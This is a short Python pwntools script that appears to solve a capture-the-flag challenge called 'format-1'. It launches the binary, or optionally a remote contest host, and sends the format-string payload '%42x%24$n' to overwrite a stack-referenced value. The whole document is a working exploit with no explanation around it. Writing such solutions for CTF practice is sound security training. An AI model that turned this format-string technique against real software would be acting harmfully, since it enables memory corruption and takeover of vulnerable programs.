#!/usr/bin/env python

from pwn import *

r = process("./format-1")
#r = remote("shell.2019.nactf.com", 31560)
pause()

r.recvuntil("Type something>")
payload = (
    "%42x%24$n"
)
r.sendline(payload)
print(r.recvall())

r.close()
